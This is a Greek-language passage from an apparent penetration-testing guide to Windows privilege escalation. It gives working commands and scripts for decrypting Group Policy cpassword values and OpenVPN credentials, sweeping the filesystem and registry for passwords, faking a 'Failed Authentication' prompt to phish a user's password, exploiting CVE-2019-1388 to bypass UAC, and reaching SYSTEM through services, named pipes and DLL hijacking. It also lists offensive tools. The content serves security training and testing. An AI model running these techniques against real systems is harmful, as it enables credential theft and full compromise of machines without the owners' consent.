Προηγουμένως υπήρχε μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανών μέσω των Προτιμήσεων Ομάδας Πολιτικής (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά ελαττώματα ασφαλείας. Καταρχήν, τα Αντικείμενα Ομάδας Πολιτικής (GPOs), αποθηκευμένα ως αρχεία XML στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε χρήστη του τομέα. Δεύτερον, οι κωδικοί πρόσβασης μέσα σε αυτά τα GPPs, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημοσίως τεκμηριωμένο προεπιλεγμένο κλειδί, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε πιστοποιημένο χρήστη. Αυτό αντιπροσώπευε ένα σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει σε χρήστες να αποκτήσουν αυξημένα προνόμια.

Για τη μείωση αυτού του κινδύνου, αναπτύχθηκε μια λειτουργία για τον έλεγχο των τοπικά αποθηκευμένων αρχείων GPP που περιέχουν ένα πεδίο "cpassword" που δεν είναι κενό. Κατά τον εντοπισμό ενός τέτοιου αρχείου, η λειτουργία αποκρυπτογραφεί τον κωδικό πρόσβασης και επιστρέφει ένα προσαρμοσμένο αντικείμενο PowerShell. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες σχετικά με το GPP και την τοποθεσία του αρχείου, βοηθώντας στον εντοπισμό και την αντιμετώπιση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (προηγούμενο του W Vista)_ για αυτά τα αρχεία:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Για την αποκρυπτογράφηση του cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρησιμοποιώντας το crackmapexec για να πάρετε τους κωδικούς πρόσβασης:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Ρύθμιση Ιστοσελίδας
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα web.config με διαπιστευτήρια:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Διαπιστευτήρια OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Αρχεία καταγραφής
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα **να ζητήσετε από τον χρήστη να εισάγει τα διαπιστευτήριά του ή ακόμα και τα διαπιστευτήρια ενός διαφορετικού χρήστη** αν νομίζετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι **να ζητήσετε** απευθείας από τον **πελάτη τα διαπιστευτήρια** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που κάποτε περιείχαν **κωδικούς πρόσβασης** σε **κείμενο** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Αναζητήστε όλα τα προτεινόμενα αρχεία:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Θα πρέπει επίσης να ελέγξετε τον Κάδο για να βρείτε διαπιστευτήρια μέσα σε αυτόν.

Για **ανάκτηση κωδικών που έχουν αποθηκευτεί** από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Μέσα στο μητρώο

**Άλλοι πιθανοί κλειδιά μητρώου με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Εξαγωγή κλειδιών openssh από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό Περιηγητών

Θα πρέπει να ελέγξετε τις βάσεις δεδομένων όπου αποθηκεύονται οι κωδικοί από **Chrome ή Firefox**.\
Επίσης, ελέγξτε το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των περιηγητών, ίσως κάποιοι **κωδικοί** να είναι αποθηκευμένοι εκεί.

Εργαλεία για την εξαγωγή κωδικών από περιηγητές:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Αντικατάσταση COM DLL**

Το **Component Object Model (COM)** είναι μια τεχνολογία που υπάρχει μέσα στο λειτουργικό σύστημα Windows και επιτρέπει την **αλληλεπίδραση** μεταξύ συστατικών λογισμικού διαφορετικών γλωσσών. Κάθε συστατικό COM είναι **αναγνωρισμένο μέσω ενός αναγνωριστικού κλάσης (CLSID)** και κάθε συστατικό εκθέτει λειτουργικότητα μέσω ενός ή περισσότερων διεπαφών, που αναγνωρίζονται μέσω αναγνωριστικών διεπαφών (IIDs).

Οι κλάσεις COM και οι διεπαφές ορίζονται στο registry κάτω από **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** και **HKEY\_**_**CLASSES\_**_**ROOT\Interface** αντίστοιχα. Αυτό το registry δημιουργείται συγχωνεύοντας τα **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το παιδί registry **InProcServer32** το οποίο περιέχει μια **προεπιλεγμένη τιμή** που δείχνει σε ένα **DLL** και μια τιμή που ονομάζεται **ThreadingModel** που μπορεί να είναι **Apartment** (Μονονηματικό), **Free** (Πολυνηματικό), **Both** (Μονονηματικό ή Πολυνηματικό) ή **Neutral** (Ανεξάρτητο από νήμα).

Βασικά, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLLs** που θα εκτελεστούν, θα μπορούσατε να **αναβαθμίσετε τα δικαιώματά σας** αν αυτό το DLL θα εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν την Αντικατάσταση COM ως μηχανισμό διατήρησης, ελέγξτε:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Γενική αναζήτηση κωδικών σε αρχεία και στο registry**

**Αναζήτηση περιεχομένου αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση ενός αρχείου με συγκεκριμένο όνομα αρχείου**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζητήστε το μητρώο για ονόματα κλειδιών και κωδικούς πρόσβασης**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν κωδικούς πρόσβασης

Το [**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα plugin του msf** που δημιούργησα για να **εκτελεί αυτόματα κάθε μονάδα POST του metasploit που αναζητά διαπιστευτήρια** μέσα στο θύμα.\
Το [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν κωδικούς πρόσβασης που αναφέρονται σε αυτήν τη σελίδα.\
Το [**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα άλλο εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **συνεδρίες**, **ονόματα χρηστών** και **κωδικούς πρόσβασης** από διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε καθαρό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Διαρροές Χειριστών

Φαντάσου ότι **ένας διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά προνόμια αλλά κληρονομώντας όλους τους ανοικτούς χειριστές της κύριας διεργασίας**.\
Στη συνέχεια, αν έχεις **πλήρη πρόσβαση στη διεργασία με τα χαμηλά προνόμια**, μπορείς να αποκτήσεις τον **ανοικτό χειριστή της προνομιούχας διεργασίας που δημιουργήθηκε** με το `OpenProcess()` και **να ενθετήσεις ένα shellcode**.\
[Διάβασε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με **πώς να ανιχνεύσεις και να εκμεταλλευτείς αυτήν την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διάβασε αυτήν την **άλλη ανάρτηση για μια πιο πλήρη εξήγηση σχετικά με το πώς να δοκιμάσεις και να εκμεταλλευτείς περισσότερους ανοικτούς χειριστές διεργασιών και νημάτων που κληρονομήθηκαν με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Παραποίηση Πελάτη Ονομασμένης Σωλήνας

Οι κοινόχρηστοι τομείς μνήμης, γνωστοί ως **σωλήνες**, επιτρέπουν την επικοινωνία διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Ονομασμένοι Σωλήνες**, επιτρέποντας σε μη σχετικές διεργασίες να μοιραστούν δεδομένα, ακόμα και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με μια αρχιτεκτονική πελάτη/διακομιστή, με ρόλους που ορίζονται ως **διακομιστής ονομασμένου σωλήνα** και **πελάτης ονομασμένου σωλήνα**.

Όταν δεδομένα στέλνονται μέσω ενός σωλήνα από έναν **πελάτη**, ο **διακομιστής** που έχει δημιουργήσει το σωλήνα έχει τη δυνατότητα να **πάρει την ταυτότητα** του **πελάτη**, υποθέτοντας ότι έχει τα απαραίτητα δικαιώματα **SeImpersonate**. Εντοπίζοντας μια **προνομιούχα διεργασία** που επικοινωνεί μέσω ενός σωλήνα που μπορείς να μιμηθείς, προσφέρεται η ευκαιρία να **αποκτήσεις υψηλότερα προνόμια** αναλαμβάνοντας την ταυτότητα αυτής της διεργασίας μόλις αλληλεπιδρά με το σωλήνα που δημιούργησες. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, μπορείς να βρεις χρήσιμους οδηγούς [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](./#from-high-integrity-to-system).

Επίσης, το ακόλουθο εργαλείο επιτρέπει τη **παρεμβολή σε μια επικοινωνία ονομασμένου σωλήνα με ένα εργαλείο όπως το burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει τη λίστα και την προβολή όλων των σωλήνων για την εντοπιση προνομιούχων εξορυξεων** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Διάφορα

### **Παρακολούθηση Εντολών για κωδικούς πρόσβασης**

Όταν αποκτάς ένα κέλυφος ως χρήστης, μπορεί να υπάρχουν προγραμματισμένες εργασίες ή άλλες διεργασίες που εκτελούνται και **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το παρακάτω σενάριο καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας οποιεσδήποτε διαφορές.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών από διεργασίες

## Από Χρήστη Χαμηλών Δικαιωμάτων σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / Παράκαμψη UAC

Εάν έχετε πρόσβαση στη γραφική διεπαφή (μέσω κονσόλας ή RDP) και το UAC είναι ενεργοποιημένο, σε μερικές εκδόσεις των Microsoft Windows είναι δυνατόν να εκτελέσετε ένα τερματικό ή οποιαδήποτε άλλη διεργασία όπως "NT\AUTHORITY SYSTEM" από έναν μη προνομιούχο χρήστη.

Αυτό καθιστά δυνατή την ανάδειξη προνομίων και την παράκαμψη του UAC ταυτόχρονα με την ίδια ευπάθεια. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε οτιδήποτε και το δυαδικό που χρησιμοποιείται κατά τη διαδικασία, είναι υπογεγραμμένο και εκδόθηκε από τη Microsoft.

Μερικά από τα επηρεαζόμενα συστήματα είναι τα ακόλουθα:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείτε αυτήν την ευπάθεια, είναι απαραίτητο να εκτελέσετε τα ακόλουθα βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Έχετε όλα τα απαραίτητα αρχεία και πληροφορίες στο ακόλουθο αποθετήριο GitHub:

https://github.com/jas502n/CVE-2019-1388

## Από Διαχειριστής Μεσαίου σε Υψηλό Επίπεδο Ακεραιότητας / Παράκαμψη UAC

Διαβάστε αυτό για **μάθετε για τα Επίπεδα Ακεραιότητας**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Στη συνέχεια **διαβάστε αυτό για να μάθετε για το UAC και τις παρακάμψεις του UAC:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **Από Υψηλό Επίπεδο σε Σύστημα**

### **Νέα υπηρεσία**

Αν εκτελείστε ήδη σε ένα διαδικασία Υψηλής Ακεραιότητας, η **μετάβαση σε SYSTEM** μπορεί να είναι εύκολη απλά με το **δημιουργία και εκτέλεση μιας νέας υπηρεσίας**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Από ένα διεργασία με υψηλή εμπιστοσύνη μπορείτε να **ενεργοποιήσετε τις καταχωρήσεις του μητρώου AlwaysInstallElevated** και **να εγκαταστήσετε** ένα αντίστροφο κέλυφος χρησιμοποιώντας ένα _**.msi**_ περιτύλιγμα.\
[Περισσότερες πληροφορίες σχετικά με τα κλειδιά του μητρώου που εμπλέκονται και πώς να εγκαταστήσετε ένα πακέτο _.msi_ εδώ.](./#alwaysinstallelevated)

### Υψηλή + SeImpersonate προνόμια προς το Σύστημα

**Μπορείτε** [**να βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### Από SeDebug + SeImpersonate σε πλήρη δικαιώματα διακριτικού

Αν έχετε αυτά τα δικαιώματα διακριτικού (πιθανόν θα τα βρείτε σε μια ήδη διεργασία με υψηλή εμπιστοσύνη), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (μη προστατευμένες διεργασίες) με το δικαίωμα SeDebug, **αντιγράψετε το διακριτικό** της διεργασίας και να δημιουργήσετε μια **αυθαίρετη διεργασία με αυτό το διακριτικό**.\
Χρησιμοποιώντας αυτή την τεχνική συνήθως **επιλέγεται μια διεργασία που εκτελείται ως ΣΥΣΤΗΜΑ με όλα τα δικαιώματα διακριτικού** (_ναι, μπορείτε να βρείτε διεργασίες ΣΥΣΤΗΜΑΤΟΣ χωρίς όλα τα δικαιώματα διακριτικού_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Ονομασμένα Σωλήνες**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για την ανάδειξη σε `getsystem`. Η τεχνική αποτελείται από το **δημιουργία ενός σωλήνα και στη συνέχεια τη δημιουργία/κατάχρηση ενός υπηρεσίας για να γράψει σε αυτόν τον σωλήνα**. Στη συνέχεια, ο **server** που δημιούργησε τον σωλήνα χρησιμοποιώντας το δικαίωμα **`SeImpersonate`** θα μπορεί να **υποκαταστήσει το διακριτικό** του πελάτη του σωλήνα (η υπηρεσία) αποκτώντας δικαιώματα ΣΥΣΤΗΜΑΤΟΣ.\
Αν θέλετε να [**μάθετε περισσότερα για τους ονομασμένους σωλήνες πρέπει να διαβάσετε αυτό**](./#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα [**πώς να πάτε από υψηλή εμπιστοσύνη σε Σύστημα χρησιμοποιώντας ονομασμένους σωλήνες πρέπει να διαβάσετε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **κλέψετε μια dll** που **φορτώνεται** από μια **διεργασία** που εκτελείται ως **ΣΥΣΤΗΜΑ** θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα δικαιώματα. Επομένως, η Dll Hijacking είναι επίσης χρήσιμη για αυτόν τον τύπο ανάδειξης προνομίων, και, επιπλέον, είναι πολύ **ευκολότερο να επιτευχθεί από μια διεργασία με υψηλή εμπιστοσύνη** καθώς θα έχει **δικαιώματα εγγραφής** στους φακέλους που χρησιμοποιούνται για τη φόρτωση των dlls.\
**Μπορείτε** [**να μάθετε περισσότερα για την Dll hijacking εδώ**](dll-hijacking.md)**.**

### **Από Διαχειριστής ή Δικτυακή Υπηρεσία σε Σύστημα**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Από ΤΟΠΙΚΗ ΥΠΗΡΕΣΙΑ ή ΔΙΚΤΥΚΗ ΥΠΗΡΕΣΙΑ σε πλήρη προνόμια

**Ανάγνωση:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Στατικά δυαδικά αρχεία impacket](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Καλύτερο εργαλείο για αναζήτηση διανυσματικών ανόδων τοπικών προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για λανθασμένες ρυθμίσεις και ευαίσθητα αρχεία (**[**ελέγξτε εδώ**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Εντοπίστηκε.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για ορισμένες πιθανές λανθασμένες ρυθμίσεις και συγκέντρωση πληροφοριών (**[**ελέγξτε εδώ**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για λανθασμένες ρυθμίσεις**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει πληροφορίες συνεδρίας από PuTTY, WinSCP, SuperPuTTY, FileZilla και αποθηκευμένες συνεδρίες RDP. Χρησιμοποιήστε -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει διαπιστευτήρια από τον Διαχειριστή Διαπιστευτηρίων. Εντοπίστηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Ψεκάζει συγκεντρωμένους κωδικούς πρόσβασης σε όλο τον τομέα**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα εργαλείο απάτης και man-in-the-middle PowerShell ADIDNS/LLMNR/mDNS/NBNS.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική αναγνώριση Windows για ανόδους προνομίων**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Αναζήτηση γνωστών ευπαθειών ανόδου προνομίων (ΑΠΟΣΥΡΘΗΚΕ για το Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Χρειάζονται δικαιώματα Διαχειριστή)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση γνωστών ευπαθειών ανόδου προνομίων (χρειάζεται να μεταγλωττιστεί χρησιμοποιώντας το VisualStudio) ([**προμεταγλωττισμένο**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Απαριθμεί τον υπολογιστή αναζητώντας λανθασμένες ρυθμίσεις (περισσότερο ένα εργαλείο συγκέντρωσης πληροφοριών παρά ανόδου προνομίων) (χρειάζεται μεταγλώττιση) **(**[**προμεταγλωττισμένο**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει διαπιστευτήρια από πολλές εφαρμογές (προμεταγλωττισμένο exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Μεταφορά του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Έλεγχος για λανθασμένες ρυθμίσεις (εκτελέσιμο προμεταγλωττισμένο στο github). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές λανθασμένες ρυθμί
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Βιβλιογραφία

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

